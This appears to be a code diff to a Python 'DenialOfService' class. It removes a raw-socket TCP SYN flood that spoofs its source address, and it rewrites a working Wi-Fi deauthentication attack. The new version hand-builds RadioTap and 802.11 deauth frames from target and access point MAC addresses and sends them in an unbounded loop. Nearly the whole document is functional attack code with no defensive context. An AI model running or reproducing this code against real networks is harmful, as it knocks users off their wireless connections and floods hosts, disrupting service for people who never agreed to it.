@@ -11,115 +11,89 @@ import struct
 class DenialOfService():
     """Denial of service attacks."""
 
-    def __init__(self, interface, channel):
+    def __init__(self, target_addr, access_point, interface, channel):
         """Initialize variables."""
+        self.target_addr = target_addr
+        self.access_point = access_point
         self.interface = interface
         self.manager = InterfaceManager(interface)
         self.manager.wlan_channel(channel)
         self.sending = False
         self.running = False
 
-    def flood(self, target_addr, quantity, target_port=80):
-        """Flood attack"""
-        # set the interface to the correct mode
-        self.manager.wlan_mode(InterfaceManager.MANAGED_MODE)
-        # create socket
-        #   AF_INET = ipv4
-        #   SOCK_RAW = bypass system checks
-        #   IPPROTO_TCP = tcp protocol
-        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-        # set for custom ip header
-        #   IPPROTO_TCP = tcp protocol (the socket we use)
-        #   IP_HDRINCL = socket will not generate ip header (if set to 1)
-        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-
-        # syn flag
-        flags = 1 << 1
-
-        # construct nearly empty ip + tcp packet :
-        #   big-endian (for network)
-        #   ip  frame: 12B empty, 4B src_addr, 4B dst_addr
-        #   tcp frame: 2B empty, 2B target_port, 9B empty, 1B flags, 6B empty
-        packet = struct.pack(
-            '!12x4s4s2xH9xB6x',
-            socket.inet_aton('192.168.0.1'),
-            socket.inet_aton(target_addr),
-            target_port,
-            flags)
-
-        # send the packets
-        print(f'[INFO]',
-              f'Sending {quantity} TCP SYN packets',
-              f'to {target_addr}:{target_port}')
-        for i in range(0, quantity):
-            s.sendto(packet, (target_addr, target_port))
-        print(f'[INFO]',
-              f'Done sending {quantity} TCP SYN packets',
-              f'to {target_addr}:{target_port}')
-
-    def deauth(self, target_addr, access_point):
-        """Deauthentication attack"""
-        # create socket
-        #   AF_PACKET = raw packet
-        #   SOCK_RAW = bypass system checks
+    def deauth(self):
+        """Perform a deauthentication attack."""
+        # https://man7.org/linux/man-pages/man7/packet.7.html
         s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
         s.bind((self.interface, 0))
 
-        # radio tap frame bytes
-        length = b'\x08'  # empty radio tap frame is at minimum 8 bytes.
+        # The RadioTap version is always 0
+        rt_version = 0
+        # The padding is always 0
+        rt_padding = 0
+        # The empty RadioTap frame has length of 8 bytes
+        rt_length = 8
+        # The RadioTap flags are irrelevant
+        rt_flags = 0   
+        # Construct the empty RadioTap frame (1,1,2,4 bytes)
+        # https://docs.python.org/3/library/struct.html
+        rt_frame = struct.pack(
+            'BBHI',
+            rt_version,
+            rt_padding,
+            rt_length,
+            rt_flags
+            )
 
-        # 802.11 frame bytes
-        frame_control = b'\xc0\x00'  # deauth (subtype 12)
-        addr1 = unhexlify(''.join(
-            [c if (i + 1) % 3 else '' for i, c in enumerate(target_addr)]))
-        addr2 = unhexlify(''.join(
-            [c if (i + 1) % 3 else '' for i, c in enumerate(access_point)]))
-        addr3 = unhexlify(''.join(
-            [c if (i + 1) % 3 else '' for i, c in enumerate(access_point)]))
+        # The 802.11 de-authentication subtype(4bits), type(2bits), version(2bits)
+        dot11_type = int(b'11000000', 2)
+        # The 802.11 flags are irrelevant
+        dot11_flags = 0 
+        # The 802.11 duration is irrelevant
+        dot11_dur = 0
+        # The 802.11 receiver address
+        dot11_ra = bytes(map(lambda x: int(x, 16) , self.target_addr.split(':')))
+        # The 802.11 transmitter address
+        dot11_ta = bytes(map(lambda x: int(x, 16) , self.access_point.split(':')))
+        # The 802.11 access point address
+        dot11_ap = dot11_ta
+        # The 802.11 sequence control is irrelevant
+        dot11_sc = 0
+        # The 802.11 reason code is irrelevant (0 is fine)
+        dot11_reason = 0
+        # Construct the 802.11 frame (1,1,2,6,6,6,2,2 bytes)
+        # https://docs.python.org/3/library/struct.html
+        dot11_frame = struct.pack(
+            'BBH6s6s6sHH',
+            dot11_type,
+            dot11_flags,
+            dot11_dur,
+            dot11_ra,
+            dot11_ta,
+            dot11_ap,
+            dot11_sc,
+            dot11_reason
+        )
 
-        # construct nearly empty packet:
-        #   big-endian (for network)
-        #   radio tap header: 2B empty, 2B length, 4B empty
-        #   802.11 header: 2B control, 2B empty (duration)
-        #                  6B addr1, 6B addr2, 6B addr3
-        #                  4B empty (sequence control + ht control)
-        packet = struct.pack(
-            '!2x2s4x2s2x6s6s6s4x',
-            length,
-            frame_control,
-            addr1,
-            addr2,
-            addr3)
+        # Construct the full payload (RadioTap + 802.11)
+        payload = rt_frame + dot11_frame 
 
-        while self.running:
-            if self.sending:
-                # send the packets
-                print(f'[INFO]',
-                      f'Sending DEAUTH packets',
-                      f'to {target_addr} on AP {access_point}')
-                while self.sending:
-                    s.send(packet)
-                print(f'[INFO]',
-                      f'Done sending DEAUTH packets',
-                      f'to {target_addr} on AP {access_point}')
-            else:
-                time.sleep(1)
+        # Send packets while running and sending
+        while 1:
+            while self.sending:
+                s.send(payload)
+            time.sleep(1)
 
-    def init(self, device, ap):
-        self.running = True
-        self.deauth(device, ap)
-
-    def init_deauth(self, device, ap):
-        def _():
-            self.running = True
-            self.deauth(device, ap)
-        return _
-
-    def start(self, event):
+    def start_sending(self, _):
+        """Start sending deauthentication packets."""
         self.sending = True
+        print(f'[INFO]',
+              f'Sending DEAUTH packets',
+              f'to {self.target_addr} on AP {self.access_point}')
 
-    def stop(self, event):
+    def stop_sending(self, _):
+        """Stop sending deauthentication packets."""
         self.sending = False
-
-    def exit_deauth(self):
-        self.running = False
+        print(f'[INFO]',
+              f'Done sending DEAUTH packets',
+              f'to {self.target_addr} on AP {self.access_point}')
